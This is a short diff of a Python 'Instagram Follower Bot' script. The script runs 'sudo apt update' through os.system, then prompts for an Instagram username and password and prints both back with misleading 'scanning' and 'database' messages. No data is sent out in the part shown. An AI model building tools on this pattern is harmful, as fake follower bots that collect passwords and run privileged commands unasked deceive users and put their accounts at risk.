@@ -4,13 +4,13 @@ import os
 import platform
 current_os = platform.system()
 if current_os == "Linux":
-    os.system('sudo apt-get update')
+    # print('sudo apt update')
+    os.system('sudo apt update')
 print("Instagram Follower Bot")
 name = input('Enter your Username : ')
 print("Scanning For Username that go by: %s" % name)
 name2 = input('Enter your Password : ')
 print("Entering  database with the Password of : %s " % name2)
-
 
 
 # Accepts a int from 0 to whatever
